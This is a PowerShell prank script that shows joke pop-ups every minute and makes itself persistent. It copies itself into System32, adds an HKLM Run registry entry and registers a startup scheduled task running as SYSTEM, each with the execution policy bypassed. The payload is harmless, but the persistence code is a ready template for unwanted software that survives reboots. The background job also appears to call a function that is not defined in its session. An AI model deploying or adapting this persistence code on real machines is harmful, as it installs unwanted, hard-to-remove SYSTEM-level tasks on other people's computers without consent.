# Jokes Pop-Up Script (Persistence)
function Show-JokePopup {
    Add-Type -AssemblyName System.Windows.Forms

    $Jokes = @(
        "Why don't skeletons fight each other? They don't have the guts.",
        "Why did the scarecrow win an award? Because he was outstanding in his field!",
        "Why don’t oysters donate to charity? Because they are shellfish.",
        "Why don't programmers like nature? It has too many bugs.",
        "What do you call fake spaghetti? An impasta!"
    )

    $RandomJoke = Get-Random -InputObject $Jokes
    [System.Windows.Forms.MessageBox]::Show($RandomJoke, "Joke Time!", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Information)
}

# Function to run jokes every 60 seconds
function Start-JokeLoop {
    while ($true) {
        Show-JokePopup
        Start-Sleep -Seconds 60
    }
}

# Persistence via Registry (runs script at startup)
function Set-RegistryPersistence {
    $scriptPath = "C:\Windows\System32\jokes.ps1"
    
    # Save the script to the specified path
    Copy-Item $MyInvocation.MyCommand.Path -Destination $scriptPath -Force

    # Add to the registry for startup persistence
    New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" `
                     -Name "JokePopup" `
                     -Value "powershell -ExecutionPolicy Bypass -NoProfile -File $scriptPath" `
                     -Force
    Write-Host "[+] Persistence added via registry."
}

# Function to create Scheduled Task for persistence
function Set-ScheduledTaskPersistence {
    $scriptPath = "C:\Windows\System32\jokes.ps1"
    
    # Create the scheduled task to run on startup
    $taskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -NoProfile -File $scriptPath"
    $taskTrigger = New-ScheduledTaskTrigger -AtStartup
    $taskPrincipal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount
    $taskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries

    Register-ScheduledTask -TaskName "JokePopupTask" `
                           -Action $taskAction `
                           -Trigger $taskTrigger `
                           -Principal $taskPrincipal `
                           -Settings $taskSettings `
                           -Force
    Write-Host "[+] Persistence added via scheduled task."
}

# Main Execution
# Run Joke Loop in background, do not wait for it to end
Start-Job -ScriptBlock { Start-JokeLoop } 

# Set Registry and Scheduled Task Persistence
Set-RegistryPersistence
Set-ScheduledTaskPersistence

Write-Host "[+] Joke pop-ups should now persist even after closing PowerShell."

